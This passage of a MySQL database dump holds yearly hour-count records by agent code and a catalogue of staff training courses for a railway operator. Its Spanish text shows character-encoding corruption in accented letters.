),(619,2148,'2021-09-22',480,1),(620,2148,'2021-09-23',480,1),(621,2148,'2021-09-27',444,1),(622,2148,'2021-09-28',444,1),(623,2148,'2021-09-29',444,1),(624,2148,'2021-09-30',444,1),(625,2128,'2021-09-07',525,1),(626,2128,'2021-09-08',525,1),(627,2128,'2021-09-09',525,1),(628,2128,'2021-09-10',540,1),(629,2158,'2021-09-02',460,1),(630,2132,'2021-12-06',500,1),(631,2132,'2021-12-07',525,1),(632,2138,'2021-10-14',540,1),(633,2138,'2021-10-15',540,1),(634,2138,'2021-10-16',540,1),(635,2162,'2021-09-20',444,1),(636,2130,'2021-10-25',505,1),(637,2141,'2021-12-13',520,1),(638,2127,'2021-10-29',540,1),(639,2148,'2021-11-01',444,1),(640,2125,'2021-11-08',444,1),(641,2125,'2021-11-09',444,1),(642,2125,'2021-11-10',444,1),(643,2121,'2021-12-21',535,1),(644,2135,'2021-10-12',504,1),(645,2133,'2021-11-10',525,1),(646,2133,'2021-11-11',525,1),(647,2135,'2021-11-27',444,1),(648,2135,'2021-11-28',444,1),(649,2167,'2021-11-16',444,1),(650,2162,'2021-11-27',480,1),(651,2162,'2021-11-28',480,1),(652,2117,'2021-12-17',530,1),(653,2162,'2021-12-31',480,1),(654,2255,'2022-04-12',525,1),(655,2255,'2022-04-13',505,1),(656,2253,'2022-02-21',540,1),(657,2249,'2022-04-21',510,1),(659,2249,'2022-07-11',510,1),(660,2249,'2022-07-12',510,1),(661,2249,'2022-07-13',510,1),(662,2249,'2022-07-14',510,1),(663,2263,'2022-07-06',444,1),(664,2263,'2022-07-07',444,1),(665,2263,'2022-07-08',444,1),(666,2263,'2022-07-09',444,1),(667,2263,'2022-07-10',444,1),(669,2250,'2022-08-15',495,1),(670,2249,'2022-08-12',510,1),(671,2249,'2022-07-19',540,1),(672,2262,'2022-08-02',444,1),(673,2262,'2022-08-03',444,1),(674,2262,'2022-08-04',444,1),(675,2262,'2022-08-28',495,1),(677,2248,'2022-08-15',348,0),(678,2264,'2022-09-15',444,1),(679,2264,'2022-09-16',444,1),(680,2264,'2022-09-17',444,1),(681,2264,'2022-09-18',444,1),(682,2264,'2022-09-19',444,1),(683,2261,'2022-07-26',444,1),(684,2261,'2022-07-27',444,1),(685,2261,'2022-07-28',444,1),(686,2261,'2022-05-09',520,1),(687,2251,'2022-06-06',510,1),(688,2251,'2022-06-07',510,1),(690,2260,'2022-08-03',444,1),(691,2259,'2022-08-06',480,1),(692,2259,'2022-08-07',480,1),(693,2247,'2022-10-11',530,1),(694,2247,'2022-10-12',515,1),(695,2247,'2022-10-13',530,1),(696,2247,'2022-12-23',495,1),(697,2247,'2023-01-05',530,1),(698,2250,'2022-09-19',510,1),(699,2250,'2022-09-20',510,1),(700,2260,'2022-09-03',444,1),(701,2264,'2022-11-17',444,1),(702,2264,'2022-11-18',420,1),(703,2264,'2022-11-19',420,1),(704,2264,'2022-11-15',444,1),(705,2264,'2022-11-16',444,1),(706,2247,'2022-10-10',540,1),(707,2261,'2022-10-19',480,1),(708,2260,'2022-10-23',444,0),(709,2259,'2022-12-21',444,1),(710,2259,'2022-12-22',444,1),(721,2343,'2023-04-13',540,1),(722,2344,'2023-08-21',500,1),(723,2344,'2023-08-22',500,1),(724,2343,'2023-08-26',495,1),(725,2343,'2023-08-27',495,1),(726,2343,'2023-08-19',505,1),(727,2343,'2023-08-20',505,1),(728,2346,'2023-06-22',475,1),(729,2358,'2023-06-26',520,1),(731,2358,'2023-07-24',500,1),(733,2358,'2023-11-06',540,1),(734,2358,'2023-12-14',540,1),(735,2358,'2023-12-13',540,1),(736,2345,'2023-12-09',510,1),(737,2345,'2023-12-10',540,1),(738,2360,'2023-12-17',510,1),(741,2375,'2024-07-22',510,1),(742,2375,'2024-07-23',510,1),(743,2389,'2024-03-01',444,1),(744,2384,'2024-08-06',540,1),(745,2384,'2024-08-07',540,1),(746,2384,'2024-08-08',540,1),(747,2379,'2024-03-11',510,1),(749,2379,'2024-03-13',510,1),(750,2384,'2024-08-10',515,1),(751,2384,'2024-08-11',515,1),(752,2389,'2024-04-06',444,1),(753,2389,'2024-04-07',444,1),(754,2385,'2024-07-07',444,1),(755,2385,'2024-07-06',444,1),(756,2384,'2024-08-01',510,1),(757,2381,'2024-06-10',540,0),(758,2381,'2024-06-11',530,0),(759,2384,'2024-07-02',530,1),(760,2384,'2024-07-03',530,1),(761,2384,'2024-07-04',530,1),(762,2381,'2024-07-20',515,1),(763,2381,'2024-07-21',515,0),(764,2382,'2024-09-02',540,1),(765,2382,'2024-09-06',540,1),(766,2382,'2024-09-07',465,1),(767,2382,'2024-09-08',465,1),(768,2381,'2024-07-22',530,0),(769,2379,'2024-09-06',530,1),(770,2386,'2024-07-04',444,1),(771,2364,'2024-08-09',550,1),(772,2364,'2024-08-10',530,1),(773,2364,'2024-08-11',530,1),(774,2388,'2024-08-20',540,1),(775,2384,'2024-07-22',490,1),(776,2384,'2024-08-09',490,1),(777,2377,'2024-10-08',444,1),(778,2377,'2024-10-09',444,1),(779,2377,'2024-10-10',444,1),(780,2377,'2024-10-15',525,1),(781,2376,'2024-09-26',510,1),(782,2388,'2024-10-13',465,1),(783,2381,'2024-11-18',495,1),(784,2365,'2024-11-29',520,1),(785,2378,'2025-01-10',510,0),(786,2392,'2024-12-27',444,1),(787,2392,'2024-12-28',444,0),(790,2455,'2025-01-27',495,1),(791,2455,'2025-02-15',505,1),(792,2449,'2025-08-23',495,1),(793,2449,'2025-08-24',495,1),(794,2450,'2025-02-24',495,1),(797,2451,'2025-08-12',540,0),(798,2451,'2025-08-13',540,0),(799,2473,'2025-03-01',465,1),(800,2468,'2025-03-13',444,0),(801,2453,'2025-04-15',444,1),(802,2453,'2025-04-16',444,1),(803,2453,'2025-04-17',444,1),(805,2463,'2025-05-05',540,1),(807,2464,'2025-07-05',444,1),(808,2464,'2025-07-06',444,1),(809,2464,'2025-07-07',444,1),(810,2453,'2025-06-21',470,1),(812,2473,'2025-05-31',465,1),(813,2480,'2025-08-07',540,1),(814,2473,'2025-07-04',540,1),(816,2452,'2025-08-01',495,1),(817,2452,'2025-08-02',495,1),(818,2452,'2025-08-03',495,1),(819,2452,'2025-08-04',495,1),(820,2452,'2025-09-08',510,1),(821,2452,'2025-09-09',510,1),(824,2480,'2025-10-26',495,1),(825,2471,'2025-08-16',480,1),(826,2474,'2025-09-04',480,1),(827,2481,'2025-11-07',429,1),(828,2458,'2025-08-18',525,1),(829,2458,'2025-08-19',525,1),(830,2458,'2025-08-20',525,1),(831,2458,'2025-08-21',525,1),(832,2459,'2025-08-26',525,1),(833,2456,'2025-11-26',444,1),(834,2456,'2025-11-27',444,1),(835,2473,'2025-11-22',510,1),(836,2473,'2025-11-29',465,1),(837,2473,'2025-11-23',540,1),(838,2468,'2025-12-22',444,0),(839,2468,'2025-12-23',444,0),(840,2490,'2026-03-29',545,1),(841,2482,'2026-08-12',520,1),(842,2482,'2026-08-13',520,1),(843,2482,'2026-08-15',505,1),(844,2499,'2026-03-13',540,1),(846,2496,'2026-04-17',444,1),(848,2500,'2026-06-30',444,1),(849,2500,'2026-07-01',444,1),(850,2500,'2026-06-29',444,1),(851,2500,'2026-06-28',444,1),(852,2500,'2026-06-27',444,1),(853,2489,'2026-06-02',530,1),(854,2489,'2026-06-04',530,1),(855,2505,'2026-10-09',444,1),(856,2505,'2026-10-10',444,1),(857,2505,'2026-10-11',444,1),(858,2505,'2026-10-12',520,1);
/*!40000 ALTER TABLE `computo_devoluciones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `computos`
--

DROP TABLE IF EXISTS `computos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `computos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `computo_year` year(4) NOT NULL,
  `computo` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo_agente` (`codigo_agente`,`computo_year`),
  KEY `codigo_agente_2` (`codigo_agente`),
  CONSTRAINT `computos_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=2506 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `computos`
--

LOCK TABLES `computos` WRITE;
/*!40000 ALTER TABLE `computos` DISABLE KEYS */;
INSERT INTO `computos` VALUES (1474,245,2016,1631),(1476,180,2016,0),(1477,241,2016,3742),(1478,66,2016,1040),(1479,207,2016,773),(1480,78,2016,3890),(1481,159,2016,0),(1482,198,2016,193),(1484,291,2016,0),(1485,190,2016,1863),(1486,155,2016,0),(1487,150,2016,637),(1489,171,2016,265),(1490,244,2016,0),(1491,201,2016,6723),(1492,355,2016,3010),(1493,239,2016,600),(1494,247,2016,0),(1495,292,2016,984),(1496,81,2016,5366),(1498,197,2016,2947),(1500,356,2016,0),(1501,200,2016,397),(1502,367,2016,2123),(1503,196,2016,272),(1504,126,2016,2020),(1505,129,2016,354),(1590,66,2017,171),(1591,78,2017,3405),(1592,126,2017,0),(1593,129,2017,502),(1595,150,2017,1036),(1596,155,2017,0),(1597,159,2017,0),(1600,171,2017,914),(1601,190,2017,0),(1602,196,2017,0),(1603,197,2017,1443),(1604,198,2017,1262),(1605,200,2017,0),(1606,201,2017,1979),(1607,207,2017,705),(1609,239,2017,0),(1610,241,2017,3330),(1611,244,2017,3025),(1612,245,2017,0),(1613,247,2017,3770),(1614,291,2017,0),(1615,292,2017,1135),(1616,355,2017,1935),(1617,356,2017,0),(1618,358,2017,6524),(1619,363,2017,13004),(1620,366,2017,8207),(1621,367,2017,8355),(1622,370,2017,7109),(1623,371,2017,4924),(1624,375,2017,1391),(1625,380,2017,4050),(1626,381,2017,304),(1627,382,2017,218),(1628,385,2017,2901),(1629,63,2017,16084),(1631,81,2017,5378),(1632,89,2017,0),(1634,133,2017,809),(1635,136,2017,0),(1636,143,2017,2917),(1637,167,2017,0),(1638,179,2017,95),(1639,181,2017,911),(1640,202,2017,1702),(1641,217,2017,1151),(1643,228,2017,3930),(1644,229,2017,12163),(1645,233,2017,0),(1646,234,2017,757),(1648,253,2017,4263),(1649,276,2017,3649),(1650,277,2017,0),(1651,287,2017,0),(1652,293,2017,2115),(1653,306,2017,3374),(1654,336,2017,0),(1655,378,2017,1776),(1656,379,2017,5501),(1658,225,2016,2537),(1661,225,2017,2537),(1662,395,2017,0),(1663,393,2017,0),(1666,394,2017,0),(1735,1000,2017,1400),(1795,63,2018,2839),(1797,81,2018,3406),(1798,126,2018,3633),(1799,129,2018,0),(1800,133,2018,6506),(1801,136,2018,886),(1802,143,2018,0),(1803,150,2018,944),(1804,155,2018,0),(1805,159,2018,2891),(1806,167,2018,0),(1807,171,2018,877),(1808,181,2018,204),(1809,190,2018,1831),(1810,196,2018,0),(1811,197,2018,0),(1812,198,2018,0),(1813,200,2018,0),(1814,201,2018,672),(1815,207,2018,0),(1816,217,2018,845),(1817,225,2018,2435),(1818,228,2018,1618),(1819,229,2018,432),(1820,233,2018,1154),(1821,234,2018,115),(1822,239,2018,1447),(1823,241,2018,0),(1824,244,2018,2260),(1825,245,2018,0),(1826,247,2018,2013),(1827,253,2018,0),(1828,276,2018,2527),(1829,277,2018,665),(1830,287,2018,0),(1831,291,2018,0),(1832,292,2018,0),(1833,306,2018,0),(1834,336,2018,1611),(1835,358,2018,2277),(1836,363,2018,4457),(1837,366,2018,866),(1838,367,2018,1702),(1839,370,2018,2440),(1840,371,2018,2359),(1841,375,2018,2883),(1842,378,2018,1148),(1843,379,2018,0),(1844,380,2018,3201),(1845,381,2018,573),(1846,382,2018,1423),(1847,385,2018,0),(1848,393,2018,1025),(1849,394,2018,1118),(1850,395,2018,1448),(1851,402,2018,54),(1852,403,2018,0),(1911,1000,2018,1763),(1961,81,2019,1067),(1962,129,2019,0),(1963,150,2019,306),(1964,155,2019,3835),(1965,159,2019,0),(1966,171,2019,1678),(1967,190,2019,1221),(1968,196,2019,2504),(1969,197,2019,770),(1970,198,2019,561),(1971,200,2019,0),(1972,201,2019,0),(1973,207,2019,0),(1974,239,2019,714),(1975,241,2019,1533),(1976,244,2019,0),(1977,245,2019,2031),(1978,247,2019,1958),(1979,291,2019,416),(1980,292,2019,1951),(1981,375,2019,0),(1982,381,2019,32),(1983,393,2019,0),(1984,417,2019,0),(1985,418,2019,0),(1986,63,2019,3217),(1987,73,2019,0),(1988,178,2019,0),(1989,191,2019,0),(1990,225,2019,3211),(1991,228,2019,2164),(1992,229,2019,892),(1993,233,2019,0),(1994,253,2019,394),(1995,276,2019,385),(1996,277,2019,846),(1997,287,2019,0),(1998,293,2019,0),(1999,363,2019,3359),(2000,366,2019,3094),(2001,367,2019,70),(2002,370,2019,332),(2003,371,2019,2900),(2004,378,2019,1596),(2005,379,2019,443),(2006,382,2019,2751),(2007,394,2019,0),(2008,402,2019,673),(2009,403,2019,501),(2115,81,2020,83),(2116,150,2020,0),(2117,159,2020,2339),(2118,171,2020,1673),(2119,190,2020,270),(2120,196,2020,0),(2121,197,2020,2102),(2122,198,2020,0),(2123,200,2020,206),(2124,201,2020,0),(2125,207,2020,1354),(2126,239,2020,4076),(2127,241,2020,3407),(2128,244,2020,2011),(2129,247,2020,740),(2130,291,2020,2351),(2131,292,2020,2247),(2132,367,2020,3642),(2133,380,2020,2218),(2134,421,2020,202),(2135,422,2020,3014),(2136,423,2020,813),(2137,424,2020,0),(2138,425,2020,1904),(2139,432,2020,495),(2140,63,2020,0),(2141,89,2020,454),(2142,136,2020,0),(2143,143,2020,0),(2144,167,2020,0),(2145,181,2020,507),(2146,202,2020,0),(2147,228,2020,2134),(2148,229,2020,4538),(2149,233,2020,0),(2150,234,2020,0),(2151,253,2020,330),(2152,277,2020,0),(2153,287,2020,0),(2154,306,2020,0),(2155,363,2020,0),(2156,371,2020,0),(2157,378,2020,0),(2158,379,2020,2953),(2159,394,2020,2440),(2160,395,2020,0),(2161,402,2020,2397),(2162,407,2020,5092),(2163,413,2020,3547),(2164,418,2020,2214),(2165,426,2020,0),(2166,427,2020,0),(2167,428,2020,619),(2168,429,2020,1018),(2169,431,2020,0),(2170,435,2020,486),(2247,159,2021,2843),(2248,167,2021,348),(2249,196,2021,4092),(2250,197,2021,1360),(2251,244,2021,1167),(2252,277,2021,211),(2253,291,2021,240),(2254,306,2021,1192),(2255,394,2021,2829),(2256,421,2021,469),(2257,426,2021,54),(2258,429,2021,147),(2259,448,2021,2035),(2260,449,2021,2130),(2261,450,2021,2397),(2262,451,2021,1813),(2263,455,2021,2420),(2264,457,2021,4492),(2265,458,2021,146),(2323,467,2021,0),(2343,196,2022,2394),(2344,197,2022,744),(2345,200,2022,1176),(2346,202,2022,471),(2347,207,2022,43),(2348,241,2022,2467),(2349,245,2022,352),(2350,247,2022,2383),(2351,253,2022,312),(2352,292,2022,106),(2353,395,2022,463),(2354,407,2022,160),(2355,423,2022,310),(2356,428,2022,2275),(2357,449,2022,72),(2358,450,2022,2401),(2359,451,2022,168),(2360,459,2022,702),(2361,469,2022,94),(2363,245,2023,31),(2364,253,2023,1633),(2365,306,2023,247),(2366,363,2023,528),(2367,380,2023,426),(2368,407,2023,21),(2369,418,2023,853),(2370,427,2023,2226),(2371,435,2023,894),(2372,159,2023,69),(2373,171,2023,354),(2374,190,2023,71),(2375,197,2023,721),(2376,244,2023,672),(2377,247,2023,1974),(2378,291,2023,267),(2379,292,2023,1564),(2380,428,2023,1111),(2381,443,2023,3007),(2382,449,2023,2173),(2383,450,2023,45),(2384,451,2023,5652),(2385,455,2023,1026),(2386,458,2023,1950),(2387,465,2023,208),(2388,467,2023,1044),(2389,476,2023,1259),(2390,477,2023,226),(2391,478,2023,133),(2392,479,2023,2528),(2393,482,2023,1743),(2394,485,2023,0),(2449,196,2024,886),(2450,197,2024,657),(2451,202,2024,1169),(2452,239,2024,3195),(2453,244,2024,1870),(2454,245,2024,652),(2455,291,2024,1097),(2456,292,2024,670),(2457,363,2024,154),(2458,371,2024,1837),(2459,402,2024,532),(2460,417,2024,15927),(2461,423,2024,442),(2462,426,2024,2854),(2463,450,2024,786),(2464,455,2024,1639),(2465,464,2024,564),(2466,465,2024,771),(2467,475,2024,444),(2468,476,2024,1427),(2469,479,2024,3267),(2470,482,2024,1832),(2471,485,2024,531),(2472,490,2024,237),(2473,492,2024,2994),(2474,443,2024,532),(2475,198,2024,364),(2477,458,2024,0),(2478,196,2026,0),(2480,489,2024,1048),(2481,207,2024,429),(2482,196,2025,1443),(2483,197,2025,2456),(2484,207,2025,981),(2485,239,2025,203),(2486,245,2025,6),(2487,253,2025,763),(2488,291,2025,439),(2489,292,2025,945),(2490,363,2025,955),(2491,371,2025,636),(2492,417,2025,7557),(2493,426,2025,1748),(2494,455,2025,388),(2495,464,2025,289),(2496,465,2025,2560),(2497,478,2025,2460),(2498,485,2025,179),(2499,492,2025,629),(2500,499,2025,2017),(2501,505,2025,27),(2502,506,2025,1581),(2503,507,2025,673),(2504,508,2025,853),(2505,510,2025,1944);
/*!40000 ALTER TABLE `computos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cursos`
--

DROP TABLE IF EXISTS `cursos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cursos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre_curso` varchar(255) NOT NULL,
  `descripcion` text NOT NULL,
  `empresa` varchar(150) NOT NULL,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=63 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cursos`
--

LOCK TABLES `cursos` WRITE;
/*!40000 ALTER TABLE `cursos` DISABLE KEYS */;
INSERT INTO `cursos` VALUES (4,'NUEVO AGS GMV','FORMACION A TECNICOS DE PM E INSPECTORES SOBRE EL FUNCIONAMIENTO DEL NUEVO AGS DE GMV','ETS-RFV','2018-01-08 12:30:54','2018-01-08 12:30:54'),(5,'COMUNICACIONES EFECTIVAS','FORMACION SOBRE LA FORMA DE TRANSMITIR MENSAJES DE MANERA EFECTIVA Y SEGURA','ESM','2018-01-08 12:32:26','2018-01-08 12:32:26'),(6,'PERCEPCION DEL RIESGO','Los errores debidos a la inadecuada percepciГіn de los riesgos son conocidos por los expertos en factores humanos y resulta altamente eficaz disponer de estas competencias para los profesionales','ESM','2018-01-08 12:34:19','2018-01-08 12:34:19'),(7,'PRINCIPIOS AUTODEFENSA PARA MUJERES','CURSO PRINCIPIOS AUTODEFENSA PARA MUJERES','EXTERNA','2018-01-09 13:20:55','2018-01-10 12:48:25'),(9,'AUTOPROTECCION','CURSO AUTOPROTECCION','EXTERNA','2018-01-10 12:41:21','2018-01-10 12:47:57'),(10,'DESFIBRILADORES','CURSO SOBRE EL USO DE LOS DEFIBRILADORES PARA LOS TECNICOS DE RED','EXTERNA','2018-01-10 12:42:13','2018-01-10 12:48:04'),(11,'EXTINCION INCENDIOS','CURSO SISTEMAS CONTRAINCENDIOS','EXTERNA','2018-01-10 12:45:52','2018-01-10 12:48:53'),(12,'NUEVO TELEMANDO ESTACIONES','CURSO NUEVO TELEMANDO ESTACIONES','EXTERNA','2018-01-10 12:47:11','2018-01-10 12:48:12'),(13,'RIESGOS ELECTRICOS','CURSO PARA LOS NUEVOS TECNICOS DE RED','ETS','2018-01-17 12:38:54','2018-01-18 12:21:10'),(14,'GESTIГ“N DEL ESTRГүS','.','IMQ','2018-01-29 08:36:27','2018-02-01 13:08:13'),(15,'PRIMEROS AUXILIOS','PRIMEROS AUXILIOS','EXTERNA','2018-01-30 07:05:56','2018-01-30 07:05:56'),(16,'REGLAMENTO DE CIRCULACION Y SEГ‘ALES','FORMACION O RECICLAJE SOBRE EL REGLAMENTO DE CIRCULACION Y SEГ‘ALES','ETS','2018-04-05 13:59:21','2018-04-05 13:59:21'),(17,'NORMATIVA DE SEGURIDAD','FORMACIГ“N SOBRE LA NORMATIVA DE SEGURIDAD DE APLICACIГ“N EN EL ГҒMBITO DEL FERROCARRIL','ETS','2018-04-05 14:00:18','2018-04-05 14:00:18'),(18,'SISTEMAS DE INFORMACIГ“N AL PUBLICO ','FORMACIГ“N SOBRE EL MANEJO Y UTILIZACIГ“N DEL SISTEMA DE INFORMACIГ“N AL PUBLICO(SIP) RIPUBLIC DE REVENGA ','ETS','2018-05-17 06:02:25','2018-05-17 06:02:25'),(19,'CONCEPTOS BГҒSICOS CIRCULACIГ“N','IntroducciГіn y conceptos generales de circulaciГіn.','ETS','2018-05-18 07:15:02','2018-05-18 07:15:02'),(20,'TOMA DE DECISIONES','Normas de actuaciГіn para las incidencias que afectan a la falta de  informaciГіn del trГЎfico en el CTC.','ETS','2018-06-01 05:20:15','2018-06-01 05:20:15'),(21,'ACOGIDA NUEVAS INCORPORACIONES SEGURIDAD Y SALUD LABORAL','FormaciГіn inicial para los nuevos ingresos y normativas de Seguridad y Salud Laboral','ETS','2018-06-06 06:19:56','2018-06-06 06:19:56'),(26,'MOTIVACION','MOTIVACION','Fernando Romero','2018-10-04 08:36:55','2018-11-13 11:33:33'),(27,'GRP','Funcionamiento del Gestor de Rutas y Prioridades (Eventos, maniobras automГЎticas, etc.)','THALES','2018-11-07 08:35:03','2018-11-07 08:35:03'),(28,'BEGICROSSING SISTEMA  EN PASOS A NIVEL','FormaciГіn Operadores PM Amara sobre sistema Begicrossing en los pasos a nivel ','BEGIRALE','2018-11-27 07:16:39','2018-11-27 07:30:35'),(30,'FORMACION PUERTAS Y RADIOTELEFONIA EMU 900','FormaciГіn en Lebario, puertas y RadiotelefonГӯa EMU 900.','EUSKOTREN','2019-12-02 16:56:30','2019-12-02 16:56:30'),(31,'REGLAMENTO CIRCULACION Y SEГ‘ALES','Nuevos TГ©cnicos de red habilitados','ETS','2019-12-04 10:17:32','2019-12-04 10:17:32'),(32,'CORTE DE TENSION ','VerificaciГіn de tensiГіn, puesta a tierra, accionamiento manual de secccionadores','ETS','2019-12-04 11:16:56','2019-12-04 11:22:39'),(33,'DistribuciГіn energia en el ferrocarril','Conocimientos jefes de servicio para subestaciones, catenaria y cortes de tensiГіn','ETS','2020-02-06 07:49:59','2020-02-06 07:50:34'),(34,'Nuevo Tetra','Curso sobre la nueva versiГіn web del Tetra','SAMPOL','2020-02-25 12:49:41','2020-02-25 12:49:41'),(35,'AUTOPROTECCIГ“N JEFE PUESTO DE MANDO ATXURI','AutoprotecciГіn para personas de  nuevo acceso al puesto de jefe de servicio, impartido por ETS, seguridad','ETS','2020-03-05 12:29:52','2020-03-05 12:29:52'),(36,'APLICACIONES GESTION PUESTO DE MANDO','FormaciГіn relacionada con todos los aplicativos de uso  en circulaciГіn utilizados por el personal del Puesto de Mando o en linea.','ETS-RFV','2020-07-09 06:18:17','2020-07-09 06:18:17'),(37,'SALUD LABORAL','SALUD LABORAL','ETS-RFV','2020-07-09 08:50:10','2020-07-09 08:50:10'),(38,'PLAN DE AUTOPROTECCION Y NORMAS DE SEGURIDAD','PLAN DE AUTOPROTECCION Y NORMAS DE SEGURIDAD DE ETS','ETS-RFV','2020-07-09 08:52:10','2020-07-09 08:52:10'),(39,'ACCIONAMIENTO DE DIFERENTES TIPOS DE AGUJAS','ACCIONAMIENTO DE DIFERENTES TIPOS DE AGUJAS','ETS-RFV','2020-07-09 08:52:50','2020-07-09 08:52:50'),(40,'MATERIAL MOVIL','MATERIAL MOVIL','ETS-RFV','2020-07-09 08:53:48','2020-07-09 08:53:48'),(41,'CONOCIMIENTO DE LINEA','CONOCIMIENTO DE LINEA','ETS-RFV','2020-07-09 09:15:59','2020-07-09 09:15:59'),(42,'Reglamento CirculaciГіn ADIF','ArtГӯculos que aplican al personal de circulaciГіn de Ariz Mercancias','ETS','2020-08-03 14:03:31','2020-08-03 14:03:31'),(43,'NORMATIVA COMPLEMENTARIA_ARIZ MERCANCIAS','Normativa complementaria al RCS','ETS','2020-08-03 14:09:52','2020-08-03 14:09:52'),(44,'CARACTERISTICAS FISICAS Y TECNICAS DE ARIZ','VISITAR INSTALACIONES','ETS','2020-08-03 14:13:01','2020-08-03 14:13:01'),(45,'CARACTERISTICAS FISICAS Y TECNICAS DE LUTXANA','VISITA INSTALACIONES','ETS','2020-08-03 14:17:03','2020-08-03 14:17:03'),(46,'INCIDENCIAS 2020 TECNICOS/TECNICAS PUESTO DE MANDO ATXURI','Analizar con los tГ©cnicos/as del P. Mando incidentes de circulaciГіn, repaso de funcionamiento del Euroloop y aclarar forma de registrar en el G.I.E.','E.T.S.','2021-02-22 07:24:34','2021-02-23 11:00:20'),(47,'INCIDENCIAS 2020 JEFES DE SERVICIO ATXURI','Repaso incidentes 2020 y anГЎlisis de incidente SU-MN','ETS','2021-03-08 08:11:29','2021-03-08 08:11:29'),(48,'Catenaria TГ©cnicos de Red','FormaciГіn interna bГЎsica de los elementos y equipamientos de catenaria en la red de ETS','ETS-RFV','2021-05-25 14:23:39','2021-05-25 14:23:39'),(49,'TELEMANDO ENERGГҚA','FORMACIГ“N ORIENTADA A LOS JEFES DE SERVICIO, TГүCNICOS DE PM Y TRH SOBRE EL TELEMANDO DE ENERGГҚA','INSITEL','2021-09-06 05:34:40','2024-09-16 04:52:50'),(50,'ARIZ MERCANCIAS','Curso online sobre la estaciГіn, tareas y operaciГіn de Ariz mercancГӯas.\r\nEngloba los cursos:\r\n* CARACTERISTICAS FISICAS Y TECNICAS DE ARIZ\r\n* NORMATIVA COMPLEMENTARIA_ARIZ MERCANCIAS\r\n* Reglamento CirculaciГіn ADIF','ETS','2021-11-24 07:36:24','2021-11-24 07:45:52'),(51,'NUEVO CICLO DOCUMENTAL ONBASE','FormaciГіn para explicar el funcionamiento del nuevo aplicativo para el ciclo documental de ETS','DELOITTE','2022-03-14 11:12:12','2022-03-14 11:12:12'),(52,'INCIDENCIAS 2021 JEFES DE SERVICIO ATXURI','REPASO INCIDENCIAS Y FALLOS DE CIRCULACIГ“N 2021','ETS','2022-05-18 15:33:09','2022-05-18 15:33:09'),(53,'MODULO MERCANCIAS AGS','FormaciГіn sobre el nuevo mГіdulo de mercancГӯas implementado en el AGS','ETS-RFV','2022-12-12 11:11:48','2022-12-12 11:11:48'),(54,'Sostenibilidad EnergГ©tica','La entrada en vigor de la Ley 4/2019 sobre Sostenibilidad EnergГ©tica de la Comunidad AutГіnoma Vasca, obliga a las administraciones al cumplimiento de los deberes y obligaciones que se establecen para el impulso de medidas de ahorro y eficiencia energГ©tica y para la promociГіn e implantaciГіn de energГӯas renovables.','ETS-RFV','2022-12-19 06:48:09','2022-12-19 06:48:09'),(56,'APLICACIONES INFORMATICAS TECNICOS DE RED','Curso de introducciГіn al uso de las aplicaciones informГЎticas destinadas al colectivo de TГ©cnico de Red.\r\nOnbase, GIE, Gestared, Teleindicadores Ripublic, Libro de Telefonemas, Personalges y otras que puedan aГұadirse en el futuro ','ETS-RFV','2023-07-18 06:29:56','2023-07-18 06:31:31'),(57,'PLANIFICACION DEL SERVICIO','FormaciГіn orientada al manejo de las herramientas, procedimientos y mГ©todos destinados a la PlanificaciГіn del Servicio en ETS','ETS-RFV','2023-08-31 05:09:09','2023-08-31 05:09:09'),(58,'ACTUACIГ“N ANTE SITUACIONES COMPLICADAS','Favorecer y ayudar en la recuperaciГіn del equilibrio emocional de aquellas personas que se \r\nencuentran en escenarios de crisis.Favorecer y ayudar en la recuperaciГіn del equilibrio emocional de aquellas personas que se \r\nencuentran en escenarios de crisis.','Talio','2024-02-15 11:54:06','2024-02-15 11:54:06'),(59,'CULTURA POSITIVA DE SEGURIDAD','CULTURA POSITIVA DE SEGURIDAD','ESM','2024-03-01 06:26:08','2024-03-01 06:26:08'),(60,'CONCIENCIA SITUACIONAL','CONCIENCIA SITUACIONAL','ESM','2024-03-01 06:26:36','2024-03-01 06:26:36'),(61,'ConducciГіn segura','Formaciones de conducciГіn segura','ETS','2025-06-03 10:20:03','2025-06-03 10:20:03');
/*!40000 ALTER TABLE `cursos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cursos_cargos`
--

DROP TABLE IF EXISTS `cursos_cargos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cursos_cargos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `curso_id` int(11) NOT NULL,
  `cargo_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `curso_id` (`curso_id`,`cargo_id`),
  KEY `cargo_id` (`cargo_id`),
  CONSTRAINT `cursos_cargos_ibfk_1` FOREIGN KEY (`curso_id`) REFERENCES `cursos` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION,
  CONSTRAINT `cursos_cargos_ibfk_2` FOREIGN KEY (`cargo_id`) REFERENCES `cargos` (`Id`) ON DELETE CASCADE ON UPDATE NO ACTION
) ENGINE=InnoDB AUTO_INCREMENT=326 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cursos_cargos`
--

LOCK TABLES `cursos_cargos` WRITE;
/*!40000 ALTER TABLE `cursos_cargos` DISABLE KEYS */;
